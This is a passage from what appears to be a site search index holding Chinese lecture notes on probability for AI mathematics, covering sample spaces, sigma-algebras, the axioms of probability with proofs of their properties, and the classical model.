\u200b\u6837\u672c\u7a7a\u95f4\u200b\u4e0e\u200b\u6837\u672c\u200b\u70b9\u200b</p> <p>\u200b\u968f\u673a\u200b\u5b9e\u9a8c\u200b \\(E\\) \u200b\u4e2d\u200b\u6240\u6709\u200b\u53ef\u80fd\u200b\u7ed3\u679c\u200b\u7ec4\u6210\u200b\u7684\u200b\u96c6\u5408\u200b\u79f0\u4e3a\u200b\u5b9e\u9a8c\u200b \\(E\\) \u200b\u7684\u200b\u6837\u672c\u7a7a\u95f4\u200b, \u200b\u8bb0\u200b\u4f5c\u200b \\(\\Omega\\). \u200b\u6837\u672c\u7a7a\u95f4\u200b\u4e2d\u200b\u7684\u200b\u5143\u7d20\u200b\u79f0\u4e3a\u200b\u6837\u672c\u200b\u70b9\u200b, \u200b\u8bb0\u200b\u4e3a\u200b \\(\\omega\\).</p> <p>Example</p> <p>\u200b\u629b\u63b7\u200b\u786c\u5e01\u200b\u4e24\u6b21\u200b, \u200b\u89c2\u5bdf\u200b\u6b63\u9762\u200b \\(H\\), \u200b\u53cd\u9762\u200b \\(T\\) \u200b\u7684\u200b\u51fa\u73b0\u200b\u60c5\u51b5\u200b.</p> \\[ \\Omega = \\{HH,HT,TH,TT\\} \\] <p>\u200b\u5176\u4e2d\u200b\u7684\u200b \\(HH\\) \u200b\u5c31\u662f\u200b\u6837\u672c\u200b\u70b9\u200b\u4e4b\u4e00\u200b. </p> <p>\u200b\u6211\u4eec\u200b\u5f80\u5f80\u200b\u5173\u5fc3\u200b\u7684\u200b\u662f\u200b\u6837\u672c\u7a7a\u95f4\u200b\u7684\u200b\u4e00\u5c0f\u90e8\u5206\u200b\u5b50\u96c6\u200b, \u200b\u8fd9\u200b\u5c31\u200b\u5f15\u51fa\u200b\u4e86\u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u6982\u5ff5\u200b.</p> <p>\u200b\u5b9a\u4e49\u200b 1.3 \u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b</p> <p>\u200b\u968f\u673a\u200b\u5b9e\u9a8c\u200b\u7684\u200b\u82e5\u5e72\u200b\u6837\u672c\u200b\u70b9\u200b\u7ec4\u6210\u200b\u7684\u200b\u96c6\u5408\u200b\u79f0\u4e3a\u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b, \u200b\u7b80\u79f0\u200b\u4e3a\u200b\u4e8b\u4ef6\u200b, \u200b\u5e38\u7528\u200b\u5927\u5199\u5b57\u6bcd\u200b \\(A,B,C,\\cdots\\) \u200b\u8868\u793a\u200b.</p> <p>Example</p> <p>\u200b\u8bbe\u200b\u5b9e\u9a8c\u200b \\(E\\) \u200b\u4e3a\u200b\u629b\u63b7\u200b\u4e00\u679a\u200b\u9ab0\u5b50\u200b\u5f97\u5230\u200b\u7684\u200b\u70b9\u6570\u200b, \u200b\u6837\u672c\u7a7a\u95f4\u200b \\(\\Omega=\\{1,2,3,4,5,6\\}\\), \u200b\u4e8b\u4ef6\u200b \\(A=\\) \"\u200b\u51fa\u73b0\u200b\u5947\u6570\u200b\u70b9\u200b'' , \u200b\u5373\u200b \\(A=\\{1,3,5\\}\\), \u200b\u5b83\u200b\u662f\u200b \\(\\Omega\\) \u200b\u7684\u200b\u4e00\u4e2a\u200b\u5b50\u96c6\u200b. </p> <p>\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u4e8b\u4ef6\u200b\u4e0e\u200b\u5fc5\u7136\u200b\u4e8b\u4ef6\u200b</p> <p>\u200b\u6837\u672c\u200b\u70b9\u200b\u7ec4\u6210\u200b\u7684\u200b\u96c6\u5408\u200b\u4e3a\u200b\u7a7a\u96c6\u200b \\(\\emptyset\\) \u200b\u65f6\u200b, \u200b\u79f0\u200b\u4e8b\u4ef6\u200b\u4e3a\u200b \u200b\u4e0d\u200b\u53ef\u80fd\u200b\u4e8b\u4ef6\u200b; \u200b\u6837\u672c\u200b\u70b9\u200b\u7ec4\u6210\u200b\u7684\u200b\u96c6\u5408\u200b\u4e3a\u200b\u6837\u672c\u7a7a\u95f4\u200b\u5168\u96c6\u200b \\(\\Omega\\) \u200b\u65f6\u200b, \u200b\u79f0\u200b\u4e8b\u4ef6\u200b\u4e3a\u200b \u200b\u5fc5\u7136\u200b\u4e8b\u4ef6\u200b, \u200b\u4e0d\u200b\u53ef\u80fd\u200b\u4e8b\u4ef6\u200b\u4e0e\u200b\u5fc5\u7136\u200b\u4e8b\u4ef6\u200b\u662f\u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u4e24\u79cd\u200b\u7279\u6b8a\u200b\u60c5\u5f62\u200b.</p> <p>\u200b\u6ce8\u610f\u200b, \u200b\u4e0d\u200b\u53ef\u80fd\u200b\u7684\u200b\u4e8b\u4ef6\u200b\u53d1\u751f\u200b\u7684\u200b\u6982\u7387\u200b\u4e3a\u200b \\(0\\), \u200b\u4f46\u200b\u53d1\u751f\u200b\u6982\u7387\u200b\u4e3a\u200b \\(0\\) \u200b\u7684\u200b\u4e8b\u4ef6\u200b \u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u662f\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u4e8b\u4ef6\u200b, \u200b\u5bf9\u4e8e\u200b\u5fc5\u7136\u200b\u4e8b\u4ef6\u200b\u4e5f\u200b\u7c7b\u4f3c\u200b. \u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u5728\u200b\u4e00\u6761\u200b\u7ebf\u6bb5\u200b\u4e0a\u200b\u968f\u673a\u200b\u9009\u70b9\u200b\u9009\u5230\u200b\u67d0\u200b\u4e00\u70b9\u200b\u7684\u200b\u6982\u7387\u200b. \u200b\u867d\u7136\u200b\u6982\u7387\u200b\u4e3a\u200b \\(0\\) \u200b\u4f46\u200b\u4e0d\u662f\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u4e8b\u4ef6\u200b. \u200b\u540c\u6837\u200b, \u200b\u4e0d\u9009\u5230\u200b\u67d0\u200b\u4e00\u70b9\u200b\u7684\u200b\u6982\u7387\u200b\u4e3a\u200b \\(1\\) \u200b\u4f46\u200b\u4e0d\u662f\u200b\u5fc5\u7136\u200b\u4e8b\u4ef6\u200b.</p> <p>\u200b\u5b9a\u4e49\u200b 1.4 \u200b\u9891\u7387\u200b\u4e0e\u200b\u6982\u7387\u200b</p> <p>\u200b\u8bbe\u200b \\(\\mu\\) \u200b\u662f\u200b \\(n\\) \u200b\u6b21\u200b\u5b9e\u9a8c\u200b\u4e2d\u200b\u4e8b\u4ef6\u200b \\(A\\) \u200b\u53d1\u751f\u200b\u7684\u200b\u6b21\u6570\u200b, \u200b\u5219\u200b\u4e8b\u4ef6\u200b \\(A\\) \u200b\u53d1\u751f\u200b\u7684\u200b\u9891\u7387\u200b\u4e3a\u200b \\(\\frac{\\mu}{n}\\). \u200b\u82e5\u200b\u968f\u7740\u200b \\(n\\) \u200b\u7684\u200b\u589e\u5927\u200b, \u200b\u9891\u7387\u200b\u6700\u7ec8\u200b\u7a33\u5b9a\u200b\u5730\u200b\u5728\u200b\u67d0\u200b\u4e00\u200b\u6570\u503c\u200b \\(p\\) \u200b\u9644\u8fd1\u200b\u6446\u52a8\u200b, \u200b\u5219\u200b\u8be5\u200b \\(p\\) \u200b\u503c\u200b\u79f0\u4e3a\u200b\u8be5\u200b\u4e8b\u4ef6\u200b\u7684\u200b \u200b\u6982\u7387\u200b, \u200b\u8bb0\u200b\u4e3a\u200b \\(P(A)=p\\).</p> <p>\u200b\u4ee5\u4e0a\u200b\u662f\u200b\u8f83\u4e3a\u200b\u6734\u7d20\u200b\u7684\u200b\u6982\u7387\u200b\u5b9a\u4e49\u200b, \u200b\u63a5\u4e0b\u6765\u200b\u6211\u4eec\u200b\u9610\u8ff0\u200b\u6982\u7387\u200b\u7684\u200b\u516c\u7406\u5316\u200b\u5b9a\u4e49\u200b, \u200b\u901a\u8fc7\u200b\u516c\u7406\u5316\u200b\u5b9a\u4e49\u200b\u53ef\u4ee5\u200b\u66f4\u597d\u200b\u5730\u200b\u5bf9\u200b\u6982\u7387\u200b\u7684\u200b\u4e00\u4e9b\u200b\u6027\u8d28\u200b\u8fdb\u884c\u200b\u5206\u6790\u200b.</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2001%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#12","title":"1.2 \u200b\u6982\u7387\u200b\u7684\u200b\u516c\u7406\u5316\u200b\u5b9a\u4e49","text":"<p>\u200b\u9996\u5148\u200b\u6211\u4eec\u200b\u8981\u200b\u5f15\u5165\u200b \\(\\sigma\\) \u200b\u4ee3\u6570\u200b\u7684\u200b\u5b9a\u4e49\u200b.</p> <p>\u200b\u5b9a\u4e49\u200b 1.5 \\(\\sigma\\) \u200b\u4ee3\u6570\u200b</p> <p>\u200b\u8bbe\u200b \\(\\Omega\\) \u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u975e\u200b\u7a7a\u96c6\u5408\u200b, \\(\\mathcal{F}\\) \u200b\u662f\u200b \\(\\Omega\\) \u200b\u4e0a\u200b\u7684\u200b\u4e00\u4e2a\u200b\u975e\u200b\u7a7a\u96c6\u200b\u65cf\u200b, \u200b\u82e5\u200b \\(\\mathcal{F}\\) \u200b\u6ee1\u8db3\u200b:</p> <p>(1) \\(\\Omega \\in \\mathcal{F}\\)</p> <p>(2) \u200b\u82e5\u200b \\(A \\in \\mathcal{F}\\), \u200b\u5219\u200b \\(A^c=\\Omega-A\\in \\mathcal{F}\\)</p> <p>(3) \u200b\u5bf9\u200b\u4efb\u4f55\u200b \\(\\{A_n\\} \\subset \\mathcal{F}\\), \\(\\bigcup \\limits_{n=1}^{\\infty}A_n \\in \\mathcal{F}\\)</p> <p>\u200b\u5219\u200b\u79f0\u200b \\(\\mathcal{F}\\) \u200b\u662f\u200b \\(\\Omega\\) \u200b\u4e0a\u200b\u7684\u200b\u4e00\u4e2a\u200b \\(\\sigma\\) \u200b\u4ee3\u6570\u200b.</p> <p>\u200b\u5229\u7528\u200b De Morgan's laws \u200b\u53ef\u4ee5\u200b\u5bb9\u6613\u200b\u5f97\u5230\u200b \\(\\sigma\\) \u200b\u4ee3\u6570\u200b\u4e5f\u200b\u5bf9\u200b\u53ef\u200b\u6570\u4e2a\u200b\u96c6\u5408\u200b\u7684\u200b\u4ea4\u96c6\u200b\u5c01\u95ed\u200b.</p> <p>\u200b\u5b9a\u4e49\u200b 1.6 \u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b\u5b50\u7c7b\u200b</p> <p>\u200b\u8bbe\u200b \\(\\Omega\\) \u200b\u662f\u200b\u6837\u672c\u7a7a\u95f4\u200b, \\(\\mathcal{F}\\) \u200b\u4e3a\u200b\u5b9a\u4e49\u200b\u5728\u200b \\(\\Omega\\) \u200b\u4e0a\u200b\u7684\u200b \\(\\sigma\\) \u200b\u4ee3\u6570\u200b, \u200b\u5219\u200b\u79f0\u200b \\(\\mathcal{F}\\) \u200b\u4e3a\u200b \u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b\u5b50\u7c7b\u200b.</p> <p>Example</p> <ul> <li> <p>\\(\\mathcal{F} = \\{\\varnothing, \\Omega\\}\\) \u200b\u5e73\u51e1\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b\u5b50\u7c7b\u200b;</p> </li> <li> <p>\\(\\mathcal{F} = \\{\\varnothing, \\Omega, A, \\overline{A}\\}\\) \u200b\u5305\u542b\u200b \\(A\\) \u200b\u7684\u200b\u6700\u5c0f\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b\u5b50\u7c7b\u200b;</p> </li> <li> <p>\\(\\mathcal{F} = \\{A | A \\subset \\Omega\\}\\)  \u200b\u4e0a\u200b\u7684\u200b\u6700\u5927\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b\u5b50\u7c7b\u200b;</p> </li> <li> <p>\\(\\Omega = \\{\\omega_1, \\cdots, \\omega_n\\}\\), \u200b\u5219\u200b \\(\\Omega\\) \u200b\u6240\u6709\u200b\u5b50\u96c6\u200b\u6784\u6210\u200b\u7684\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b\u5b50\u7c7b\u200b\u5171\u6709\u200b \\(2^n\\) \u200b\u4e2a\u200b\u5143\u7d20\u200b.</p> </li> </ul> <p>\u200b\u5b9a\u4e49\u200b 1.7 \u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b</p> <p>\u200b\u8bbe\u200b \\(\\mathcal{F}\\) \u200b\u662f\u200b\u6ee1\u8db3\u200b\u4e0a\u8ff0\u200b\u6761\u4ef6\u200b\u7684\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b\u5b50\u96c6\u200b\u7c7b\u200b. \u200b\u6982\u7387\u200b \\(P = P(\\cdot)\\) \u200b\u662f\u200b \\(\\mathcal{F}\\) \u200b\u4e0a\u9762\u200b\u5b9a\u4e49\u200b\u7684\u200b\u5b9e\u503c\u200b\u51fd\u6570\u200b, \u200b\u6ee1\u8db3\u200b:</p> <p>(1) \u200b\u975e\u200b\u8d1f\u6027\u200b: \\(P(A) \\geqslant 0\\) \u200b\u5bf9\u4e8e\u200b\u4e00\u5207\u200b \\(A \\in \\mathcal{F}\\);</p> <p>(2) \u200b\u89c4\u8303\u6027\u200b: \\(P(\\Omega) = 1\\);</p> <p>(3) \u200b\u53ef\u5217\u200b\u53ef\u52a0\u6027\u200b: \u200b\u82e5\u200b \\(A_n \\in \\mathcal{F}(n = 1, 2, \\cdots)\\) \u200b\u4e24\u200b\u4e24\u200b\u4e0d\u200b\u76f8\u4ea4\u200b, \u200b\u5219\u200b</p> \\[P\\left(\\bigcup_{i=1}^{\\infty} A_i\\right) = \\sum_{i=1}^{\\infty} P(A_i).\\] <p>\u200b\u6ee1\u8db3\u200b\u4ee5\u4e0a\u200b\u6761\u4ef6\u200b\u7684\u200b \\((\\Omega, \\mathcal{F}, P)\\) \u200b\u79f0\u4e3a\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b.</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b, \\(\\mathcal{F}\\) \u200b\u4e2d\u200b\u7684\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u5143\u7d20\u200b\u90fd\u200b\u5bf9\u5e94\u200b\u4e86\u200b\u6211\u4eec\u200b\u524d\u9762\u200b\u6240\u8bf4\u200b\u7684\u200b\u4e00\u4e2a\u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b, \u200b\u6982\u7387\u200b\u5c31\u662f\u200b\u5bf9\u200b\u8fd9\u4e9b\u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u5ea6\u91cf\u200b. \u200b\u56e0\u6b64\u200b \\(\\mathcal{F}\\) \u200b\u4e5f\u200b\u79f0\u4f5c\u200b\u6982\u7387\u200b\u7684\u200b\u5b9a\u4e49\u57df\u200b.</p> <p>\u200b\u4e3a\u4ec0\u4e48\u200b\u4e0d\u200b\u76f4\u63a5\u200b\u5728\u200b\u6837\u672c\u7a7a\u95f4\u200b\u7684\u200b\u5e42\u200b\u96c6\u4e0a\u200b\u5b9a\u4e49\u200b\u6982\u7387\u200b?</p> <p>\u200b\u5728\u200b\u4e0d\u53ef\u6570\u200b\u96c6\u5408\u200b(\u200b\u5982\u5b9e\u200b\u6570\u96c6\u200b \\(\\mathbb{R}\\)) \u200b\u4e0a\u200b, \u200b\u5982\u679c\u200b\u6211\u4eec\u200b\u8981\u6c42\u200b\u6d4b\u5ea6\u200b\u5728\u200b\u6bcf\u4e2a\u200b\u5b50\u96c6\u200b\u90fd\u200b\u6709\u200b\u5b9a\u4e49\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u77db\u76fe\u200b. \u200b\u6700\u200b\u8457\u540d\u200b\u7684\u200b\u4f8b\u5b50\u200b\u662f\u200b Vitali \u200b\u96c6\u200b, \u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b\u51fa\u200b \\([0,1]\\) \u200b\u7684\u200b\u67d0\u4e2a\u200b\u5b50\u96c6\u200b, \u200b\u5b83\u200b\u65e0\u6cd5\u200b\u88ab\u200b\u8d4b\u4e88\u200b\u5408\u7406\u200b\u7684\u200b\u6d4b\u5ea6\u200b, \u200b\u4f7f\u5f97\u200b\u540c\u65f6\u200b\u6ee1\u8db3\u200b\u6d4b\u5ea6\u200b\u7684\u200b\u5e73\u79fb\u200b\u4e0d\u53d8\u6027\u200b\u548c\u200b\u53ef\u5217\u200b\u53ef\u52a0\u6027\u200b.</p> <p>Tips</p> <p>\u200b\u5173\u4e8e\u200b\u6982\u7387\u200b\u4e25\u683c\u200b\u5b9a\u4e49\u200b\u7684\u200b\u66f4\u200b\u591a\u200b\u5185\u5bb9\u200b, \u200b\u9700\u8981\u200b\u5b66\u4e60\u200b\u6d4b\u5ea6\u8bba\u200b, \u200b\u5b9e\u53d8\u200b\u51fd\u6570\u200b\u7b49\u200b\u6570\u5b66\u77e5\u8bc6\u200b. (\u200b\u6709\u7a7a\u200b\u518d\u200b\u586b\u5751\u200b)</p> <p>\u200b\u6982\u7387\u200b\u7684\u200b\u6027\u8d28\u200b</p> <p>(1) \\(P(\\varnothing) = 0\\);</p> <p>(2) \u200b\u82e5\u200b \\(A \\in \\mathcal{F}\\), \u200b\u5219\u200b \\(P(A^c) = 1 - P(A)\\);</p> <p>(3) \u200b\u82e5\u200b \\(A_1, \\cdots, A_n\\) \u200b\u90fd\u200b\u5c5e\u4e8e\u200b \\(\\mathcal{F}\\) \u200b\u4e14\u200b\u4e24\u200b\u4e24\u200b\u4e0d\u200b\u76f8\u4ea4\u200b, \u200b\u5219\u200b</p> \\[P\\left(\\bigcup_{i=1}^{n} A_i\\right) = \\sum_{i=1}^{n} P(A_i); \\] <p>(4) \u200b\u82e5\u200b \\(A \\subset B, A \\in \\mathcal{F}, B \\in \\mathcal{F}\\), \u200b\u5219\u200b \\(P(A) \\leqslant P(B)\\), \u200b\u4e14\u200b</p> \\[P(B - A) = P(B) - P(A); \\] <p>(5) \u200b\u82e5\u200b \\(A_n \\subset A_{n+1}, A_n \\in \\mathcal{F}(n = 1, 2, \\cdots)\\), \u200b\u5219\u200b</p> \\[P\\left(\\bigcup_{n=1}^{\\infty} A_n\\right) = \\lim_{n \\to \\infty} P(A_n); \\] <p>(6) \u200b\u82e5\u200b \\(A_n \\supset A_{n+1}, A_n \\in \\mathcal{F}(n = 1, 2, \\cdots)\\), \u200b\u5219\u200b</p> \\[P\\left(\\bigcap_{n=1}^{\\infty} A_n\\right) = \\lim_{n \\to \\infty} P(A_n); \\] <p>(7) \u200b\u82e5\u200b \\(A_n \\in \\mathcal{F}(n = 1, 2, \\cdots)\\), \u200b\u5219\u200b</p> \\[P\\left(\\bigcup_{n=1}^{\\infty} A_n\\right) \\leqslant \\sum_{n=1}^{\\infty} P(A_n). \\] <p>\u200b\u8bc1\u660e\u200b:</p> <p>\u200b\u8fd9\u200b\u51e0\u6761\u200b\u6027\u8d28\u200b\u8bc1\u660e\u200b\u7684\u200b\u6838\u5fc3\u200b\u90fd\u200b\u662f\u200b\u53cd\u590d\u200b\u5229\u7528\u200b\u6982\u7387\u200b\u7684\u200b\u8bfe\u5217\u200b\u53ef\u52a0\u6027\u200b\u4ee5\u53ca\u200b\u96c6\u5408\u200b\u7684\u200b\u4e00\u4e9b\u200b\u6027\u8d28\u200b.</p> <p>(1) \u200b\u4ee4\u200b \\(A_1=\\Omega, A_n=\\emptyset\\ (n\\geq2)\\), \u200b\u5229\u7528\u200b\u6982\u7387\u200b\u7684\u200b\u53ef\u5217\u200b\u53ef\u52a0\u6027\u200b\u5373\u200b\u5f97\u200b \\(0=\\sum_{i=2}^{\\infty}P(\\emptyset)\\). \u200b\u6240\u4ee5\u200b \\(P(\\emptyset)=0\\).</p> <p>(2) \u200b\u4eff\u7167\u200b(1)\u200b\u8bc1\u660e\u200b\u5373\u53ef\u200b.</p> <p>(3) \u200b\u4ee4\u200b \\(A_k=\\emptyset\\ (k&gt;n)\\), \u200b\u5219\u200b \\(\\bigcup\\limits_{i=1}^{n}A_i=\\bigcup\\limits_{i=1}^{\\infty}A_i\\), \u200b\u5229\u7528\u200b\u53ef\u5217\u200b\u53ef\u52a0\u6027\u200b\u548c\u200b\u6982\u7387\u200b\u6027\u8d28\u200b(1)\u200b\u5373\u5f97\u200b. (\u200b\u8fd9\u200b\u4e00\u6761\u200b\u662f\u200b\u4e24\u200b\u4e24\u4e0d\u4ea4\u200b\u96c6\u5408\u200b\u7684\u200b\u6709\u9650\u200b\u53ef\u52a0\u6027\u200b)</p> <p>(4) \u200b\u4ee4\u200b \\(A_1=A, A_2=B-A, A_k=\\emptyset\\ (k&gt;2)\\) \u200b\u7531\u4e8e\u200b \\(A\\subset B\\) \u200b\u6545\u200b \\(A_n\\ (n=1,2,\\cdots)\\) \u200b\u4e24\u200b\u4e24\u4e0d\u4ea4\u200b. </p> <p>\u200b\u6240\u4ee5\u200b</p> \\[ P(A)+P(B-A)+0+\\cdots=P(\\bigcup\\limits_{i=1}^{\\infty}A_i)=P(B) \\] <p>\u200b\u5373\u200b</p> \\[ P(B-A)=P(B)-P(A) \\] <p>\u200b\u518d\u200b\u5229\u7528\u200b\u6982\u7387\u200b\u7684\u200b\u975e\u200b\u8d1f\u6027\u200b\u5373\u200b\u5f97\u200b \\(P(A)\\leq P(B)\\).</p> <p>(5) \u200b\u5173\u952e\u200b\u8fd8\u662f\u200b\u8981\u200b\u627e\u5230\u200b\u4e92\u4e0d\u200b\u76f8\u4ea4\u200b\u7684\u200b\u4e00\u5217\u200b\u96c6\u5408\u200b, \u200b\u5229\u7528\u200b\u6982\u7387\u200b\u7684\u200b\u53ef\u5217\u200b\u53ef\u52a0\u6027\u200b, \u200b\u4eff\u7167\u200b (4) \u200b\u7684\u200b\u601d\u8def\u200b, \u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5982\u4e0b\u200b\u6784\u9020\u200b\u96c6\u5408\u200b:</p> \\[B_1=A_1,B_n=A_n-A_{n-1}\\ (n=2,3,\\cdots)\\] <p>\u200b\u5219\u200b </p> \\[ \\bigcup\\limits_{i=1}^{\\infty}B_i=\\bigcup\\limits_{i=1}^{\\infty}A_i, \u200b\u4e14\u200b\\ B_i\\ \u200b\u4e24\u200b\u4e24\u4e0d\u4ea4\u200b \\] <p>(\u200b\u8bc1\u660e\u200b\u601d\u8def\u200b\u5c31\u662f\u200b\u5229\u7528\u200b\u5e73\u5e38\u200b\u8bc1\u660e\u200b\u96c6\u5408\u200b\u76f8\u7b49\u200b\u7684\u200b\u6280\u5de7\u200b, \u200b\u5373\u200b\u8bc1\u660e\u200b\u4e92\u4e3a\u200b\u5bf9\u65b9\u200b\u7684\u200b\u5b50\u96c6\u200b)</p> <p>\u200b\u6545\u200b </p> \\[ \\begin{align} P(\\bigcup\\limits_{i=1}^{\\infty}A_i)=P(\\bigcup\\limits_{i=1}^{\\infty}B_i)&amp;=\\sum\\limits_{i=1}^{\\infty}P(B_i)\\\\ &amp;=\\sum\\limits_{i=1}^{\\infty}P(A_{i}-A_{i-1})\\ (\u200b\u8bb0\u200b\\ A_0=\\emptyset) \\\\ &amp;=\\sum\\limits_{i=1}^{\\infty}[P(A_i)-P(A_{i-1})]\\ (\u200b\u5229\u7528\u200b\u6027\u8d28\u200b(4)) \\\\ &amp;=\\lim\\limits_{n\\to\\infty}P(A_n)\\ (\u200b\u7ea7\u6570\u200b\u7684\u200b\u548c\u200b\u7b49\u4e8e\u200b\u90e8\u5206\u200b\u548c\u200b\u7684\u200b\u6781\u9650\u200b) \\end{align} \\] <p>(6) \u200b\u5229\u7528\u200b De Morgan's laws \u200b\u548c\u200b\u6027\u8d28\u200b(5).</p> <p>(7) \u200b\u6784\u9020\u200b\u4ee5\u4e0b\u200b\u96c6\u5408\u200b:</p> \\[ B_1=A_1,B_n=A_n-\\bigcup\\limits_{i=1}^{n-1}A_i\\ (n\\geq2). \\] <p>\u200b\u5219\u200b</p> \\[ \\bigcup\\limits_{i=1}^{\\infty}B_i=\\bigcup\\limits_{i=1}^{\\infty}A_i, \u200b\u4e14\u200b\\ B_i\\ \u200b\u4e24\u200b\u4e24\u4e0d\u4ea4\u200b \\] <p>\u200b\u6545\u200b </p> \\[ \\begin{align} P(\\bigcup\\limits_{i=1}^{\\infty}A_i)=P(\\bigcup\\limits_{i=1}^{\\infty}B_i)&amp;=\\sum\\limits_{i=1}^{\\infty}P(B_i)\\\\ &amp;\\leq\\sum\\limits_{i=1}^{\\infty}P(A_i) \\ (\u200b\u5229\u7528\u200b\\ B_i\\subset A_i\\ \u200b\u548c\u200b\u6027\u8d28\u200b(4)) \\end{align} \\]"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2001%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#13","title":"1.3 \u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u5173\u7cfb\u200b\u548c\u200b\u8fd0\u7b97","text":"<p>\u200b\u4e0d\u96be\u200b\u53d1\u73b0\u200b\u968f\u673a\u200b\u4e8b\u4ef6\u200b\u95f4\u200b\u7684\u200b\u5173\u7cfb\u200b\u548c\u200b\u8fd0\u7b97\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u96c6\u5408\u200b\u95f4\u200b\u7684\u200b\u5173\u7cfb\u200b\u548c\u200b\u8fd0\u7b97\u200b, \u200b\u6240\u4ee5\u200b\u4e8b\u4ef6\u200b\u8fd0\u7b97\u200b\u7684\u200b\u6027\u8d28\u200b\u4e0e\u200b\u96c6\u5408\u200b\u8fd0\u7b97\u200b\u7684\u200b\u6027\u8d28\u200b\u7c7b\u4f3c\u200b, \u200b\u6b64\u5904\u200b\u4e0d\u518d\u200b\u8d58\u8ff0\u200b.</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2001%20%E9%9A%8F%E6%9C%BA%E4%BA%8B%E4%BB%B6%E4%B8%8E%E6%A6%82%E7%8E%87/#14","title":"1.4 \u200b\u53e4\u5178\u200b\u6982\u578b","text":"<p>\u200b\u5b9a\u4e49\u200b 1.8(1) \u200b\u53e4\u5178\u200b\u6982\u578b\u200b</p> <p>\u200b\u82e5\u200b\u968f\u673a\u200b\u73b0\u8c61\u200b\u6709\u200b\u5982\u4e0b\u200b\u4e24\u4e2a\u200b\u7279\u5f81\u200b:</p> <p>(1) \u200b\u5728\u200b\u5b9e\u9a8c\u200b\u4e2d\u200b\u5b83\u200b\u7684\u200b\u5168\u90e8\u200b\u53ef\u80fd\u6027\u200b\u53ea\u6709\u200b\u6709\u9650\u200b\u4e2a\u200b;</p> <p>(2) \u200b\u57fa\u672c\u200b\u4e8b\u4ef6\u200b\u53d1\u751f\u200b\u6216\u200b\u51fa\u73b0\u200b\u662f\u200b\u7b49\u200b\u53ef\u80fd\u200b\u7684\u200b;</p> <p>\u200b\u5219\u200b\u79f0\u200b\u5176\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6570\u5b66\u6a21\u578b\u200b\u4e3a\u200b \u200b\u53e4\u5178\u200b\u6982\u578b\u200b.</p> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b\u516c\u7406\u5316\u200b\u7684\u200b\u5b9a\u4e49\u200b</p> <p>\u200b\u5b9a\u4e49\u200b 1.8(2) \u200b\u53e4\u5178\u200b\u6982\u578b\u200b\u7684\u200b\u516c\u7406\u5316\u200b\u5b9a\u4e49\u200b</p> <p>\u200b\u53d6\u200b</p> \\[\\Omega = \\{\\omega_1, \\omega_2, \\cdots, \\omega_n\\}, \\quad \\mathcal{F} = \\{A | A \\subset \\Omega\\},\\] <p>\u200b\u4ee4\u200b \\(P\\) \u200b\u4e3a\u200b \\((\\Omega, \\mathcal{F})\\) \u200b\u4e0a\u200b\u7684\u200b\u6982\u7387\u200b\u6d4b\u5ea6\u200b,\u200b\u6ee1\u8db3\u200b</p> \\[P(\\{\\omega_1\\}) = \\cdots = P(\\{\\omega_n\\}),\\] <p>\u200b\u5219\u200b \\((\\Omega, \\mathcal{F}, P)\\) \u200b\u4e3a\u200b\u53e4\u5178\u200b\u6982\u578b\u200b\u5bf9\u5e94\u200b\u7684\u200b\u6982\u7387\u200b\u7a7a\u95f4\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b\u7ecf\u5178\u200b\u6a21\u578b\u200b\u7684\u200b\u5b9a\u4e49\u200b\u3001\u200b\u5bb9\u6613\u200b\u5f97\u5230\u200b\u7ecf\u5178\u200b\u6a21\u578b\u200b\u7684\u200b\u6982\u7387\u200b\u8ba1\u7b97\u516c\u5f0f\u200b\u3002\u200b\u8bbe\u200b\u4e8b\u4ef6\u200b \\(A = \\{\\omega_{i_1}, \\cdots, \\omega_{i_k}\\} \\in \\mathcal{F}\\)\uff0c\u200b\u5229\u7528\u200b\u6982\u7387\u200b\u7684\u200b\u6709\u9650\u200b\u53ef\u52a0\u6027\u200b\u53ef\u77e5\u200b:</p> \\[ P(A) = \\sum_{j=1}^{k} P(\\{\\omega_{i_j}\\}) = \\frac{k}{n} = \\frac{|A|}{|\\Omega|} \\] 